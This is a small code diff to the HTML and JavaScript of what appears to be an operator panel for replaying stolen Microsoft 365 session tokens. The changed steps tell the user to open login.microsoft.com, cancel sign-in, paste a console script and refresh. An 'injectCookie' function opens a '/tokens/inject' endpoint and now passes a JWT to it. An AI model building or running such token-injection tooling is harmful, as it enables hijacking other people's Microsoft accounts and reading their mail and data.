@@ -188,9 +188,9 @@
                     <strong style="color:var(--accent);margin-bottom:8px;display:block;">
                         <i class="fas fa-clipboard-list"></i> Instructions:
                     </strong>
-                    1. Navigate to <a href="https://outlook.office365.com" target="_blank" style="color:var(--accent);text-decoration:underline;">outlook.office365.com</a> in Chrome/Edge<br>
+                    1. Navigate to <a href="https://login.microsoft.com" target="_blank" style="color:var(--accent);text-decoration:underline;">login.microsoft.com</a> in Chrome/Edge<br>
                     2. When prompted to sign in, click <strong>"Cancel"</strong> or <strong>"No"</strong><br>
-                    3. Press <kbd style="background:rgba(255,255,255,0.1);padding:2px 6px;border-radius:4px;font-size:11px;">F12</kbd> -> Go to Console tab<br>
+                    3. Press <kbd style="background:rgba(255,255,255,0.1);padding:2px 6px;border-radius:4px;font-size:11px;">F12</kbd> Go to Console tab<br>
                     4. Paste the script below and press <kbd style="background:rgba(255,255,255,0.1);padding:2px 6px;border-radius:4px;font-size:11px;">Enter</kbd><br>
                     5. Press <kbd style="background:rgba(255,255,255,0.1);padding:2px 6px;border-radius:4px;font-size:11px;">F5</kbd> to refresh the page
                 </div>
@@ -312,7 +312,8 @@
         }
 
         function injectCookie(id) {
-            window.open(`${API}/tokens/inject/page/${id}`, '_blank', 'width=900,height=700');
+            const jwt = getToken();
+            window.open(`${API}/tokens/inject/page/${id}?jwt=${encodeURIComponent(jwt)}`, '_blank', 'width=900,height=700');
         }
 
         async function openDetailModal(id) {
